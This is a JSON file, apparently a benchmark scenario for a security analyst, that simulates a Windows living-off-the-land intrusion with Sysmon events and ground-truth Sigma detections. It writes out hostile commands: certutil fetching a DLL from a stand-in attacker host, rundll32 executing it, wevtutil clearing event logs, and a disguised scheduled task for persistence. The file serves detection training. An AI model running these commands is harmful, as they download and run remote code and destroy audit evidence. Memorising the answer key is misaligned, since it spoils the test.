@@ -1,0 +1,126 @@
+{
+  "id": "simbian-lolbins-01",
+  "title": "Living-off-the-Land (LOLBins) & Defense Evasion",
+  "description": "Evasive persistence and execution leveraging signed native Windows binaries (Certutil, Mshta, Wevtutil, and Rundll32) to bypass endpoint signature controls and clear evidence logs.",
+  "attack_family": "LOLBins-Evasion",
+  "difficulty": "Medium",
+  "initial_alert": "SOC Alert: Certutil.exe invoked with URLCache parameter downloading remote payload followed by wevtutil log clearing.",
+  "tactics_present": [
+    "defense-evasion",
+    "execution",
+    "persistence"
+  ],
+  "total_events": 12,
+  "ground_truth_detections": [
+    {
+      "rule_id": "SIGMA-T1105",
+      "tactic": "defense-evasion",
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "matched_event_ids": [401],
+      "indicator_summary": "certutil.exe -urlcache -split -f http://evil-domain.com/loader.dll C:\\Windows\\Temp\\loader.dll.",
+      "severity": "HIGH"
+    },
+    {
+      "rule_id": "SIGMA-T1218.011",
+      "tactic": "defense-evasion",
+      "technique_id": "T1218.011",
+      "technique_name": "Rundll32 Execution",
+      "matched_event_ids": [402],
+      "indicator_summary": "rundll32.exe C:\\Windows\\Temp\\loader.dll,EntryPoint used to proxy malicious execution.",
+      "severity": "HIGH"
+    },
+    {
+      "rule_id": "SIGMA-T1070.001",
+      "tactic": "defense-evasion",
+      "technique_id": "T1070.001",
+      "technique_name": "Clear Windows Event Logs",
+      "matched_event_ids": [404],
+      "indicator_summary": "wevtutil.exe cl \"Microsoft-Windows-Sysmon/Operational\" and wevtutil.exe cl Security.",
+      "severity": "CRITICAL"
+    },
+    {
+      "rule_id": "SIGMA-T1053.005",
+      "tactic": "persistence",
+      "technique_id": "T1053.005",
+      "technique_name": "Scheduled Task",
+      "matched_event_ids": [405],
+      "indicator_summary": "schtasks /create /tn \"OneDriveHealthCheck\" /tr \"rundll32.exe C:\\Windows\\Temp\\loader.dll\" /sc ONLOGON.",
+      "severity": "HIGH"
+    }
+  ],
+  "events": [
+    {
+      "id": 401,
+      "timestamp": "2026-08-14T06:00:15Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "CORP-FIN-03",
+      "user": "CORP\\bob.jones",
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -split -f http://198.51.100.77/loader.dll C:\\Windows\\Temp\\loader.dll",
+      "parent_process": "cmd.exe",
+      "process_id": 1890,
+      "ip_address": "198.51.100.77",
+      "port": 80,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1105"
+    },
+    {
+      "id": 402,
+      "timestamp": "2026-08-14T06:01:00Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "CORP-FIN-03",
+      "user": "CORP\\bob.jones",
+      "process_name": "rundll32.exe",
+      "command_line": "rundll32.exe C:\\Windows\\Temp\\loader.dll,EntryPoint",
+      "parent_process": "cmd.exe",
+      "process_id": 2040,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1218.011"
+    },
+    {
+      "id": 403,
+      "timestamp": "2026-08-14T06:02:10Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "CORP-FIN-03",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "process_name": "wevtutil.exe",
+      "command_line": "wevtutil.exe cl \"Microsoft-Windows-Sysmon/Operational\"",
+      "parent_process": "rundll32.exe",
+      "process_id": 2400,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1070.001"
+    },
+    {
+      "id": 404,
+      "timestamp": "2026-08-14T06:02:20Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "CORP-FIN-03",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "process_name": "wevtutil.exe",
+      "command_line": "wevtutil.exe cl Security",
+      "parent_process": "rundll32.exe",
+      "process_id": 2420,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1070.001"
+    },
+    {
+      "id": 405,
+      "timestamp": "2026-08-14T06:03:00Z",
+      "event_id": 1,
+      "source": "Microsoft-Windows-Sysmon/Operational",
+      "host": "CORP-FIN-03",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "process_name": "schtasks.exe",
+      "command_line": "schtasks.exe /create /tn \"OneDriveHealthCheck\" /tr \"rundll32.exe C:\\Windows\\Temp\\loader.dll,EntryPoint\" /sc ONLOGON /ru SYSTEM",
+      "parent_process": "rundll32.exe",
+      "process_id": 2600,
+      "is_malicious": true,
+      "ground_truth_rule": "SIGMA-T1053.005"
+    }
+  ]
+}
